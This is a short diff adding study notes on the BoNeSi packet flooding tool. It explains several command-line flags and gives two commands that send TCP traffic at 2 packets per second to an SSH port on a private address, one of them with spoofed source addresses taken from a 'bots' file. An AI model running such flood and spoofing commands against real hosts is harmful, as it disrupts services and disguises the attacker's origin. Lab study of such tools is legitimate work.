@@ -1,0 +1,9 @@
+-i is used spoof IP address.
+-p is used to assign networking protocol.
+-d is used to enter networking interface. eth0 is the networking interface.
+-r is used to send no. of packets per second. Here 2 packets are send per second. By default it uses infinite.
+10.5.2.20:22 is target IP address and target port.
+
+bonesi -i bots -p tcp -r 2 -d eth0 10.5.2.20:22
+
+bonesi -p tcp -r 2 -d eth0 10.5.2.20:22
